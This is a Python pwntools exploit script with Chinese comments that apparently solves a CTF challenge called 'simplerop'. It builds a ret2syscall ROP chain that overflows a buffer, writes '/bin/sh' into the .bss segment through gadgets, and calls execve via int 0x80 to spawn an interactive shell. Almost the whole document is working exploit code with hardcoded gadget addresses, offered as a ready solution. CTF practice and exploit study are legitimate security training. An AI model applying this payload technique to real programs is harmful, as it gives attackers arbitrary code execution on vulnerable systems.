# -*- coding: utf-8 -*-
from pwn import *
'''
这道题 就一个输入，然后是静态链接，加载了很多东西进来，
又开了nx保护，没有发现system函数，没有发现binsh参数

所以应该是ret2systemcall的题目，用rop，进行int0x80中断，执行系统调用

所以我们需要找到，有pop eax，ebx,ecx,edx,ret这样的gadget

但是我们要调用execve（/bin/sh）还需要参数，题目里面找不到参数，
那么我们只能自己去写入了，写入就要用到一些新的姿势了，
找到一种gadget，要有能将某个寄存器的内容写到内存的某个地方的功能，

这样一来，我们就可以先把bss段的地址给eax，然后再把参数给edx，
然后执行这个gadget就能实现把参数写进bss段里面了，
接着再开始把各个参数传给各个寄存器，实现系统调用

本题为ret2syscall，
使用int 0x80调用execve(/bin/sh)
eax 中为系统调用号0x0b

'''

p=process('./simplerop')


#0x080493e1 : int 0x80
int80=0x080493e1

#0x080bae06 : pop eax ; ret
pop_eax = 0x080bae06

#0x080481c9 : pop ebx ; ret
pop_ebx = 0x080481c9

# 0x0806e82a : pop edx ; ret
pop_edx = 0x0806e82a

# 0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx = 0x0806e850

bss_addr = 0x080eaf80

#0x0807b301 : mov dword ptr [eax], edx ; ret
mov_eax_edx=0x0807b301

payload='A'*32
# put "/bin/sh\x00" into bss addr
payload += p32(pop_edx)
payload += "/bin"
payload += p32(pop_eax)
payload += p32(bss_addr)
payload += p32(mov_eax_edx)
payload += p32(pop_edx)
payload += "/sh\x00"
payload += p32(pop_eax)
payload += p32(bss_addr + 4)
payload += p32(mov_eax_edx)

# 执行系统调用 int80 system call execve
payload += p32(pop_edx_ecx_ebx)
payload += p32(0x00)
payload += p32(0x00)
payload += p32(bss_addr)
payload += p32(pop_eax)
payload += p32(0x0b)
payload += p32(int80)
p.recvuntil('Your input :')
p.sendline(payload)
p.interactive()

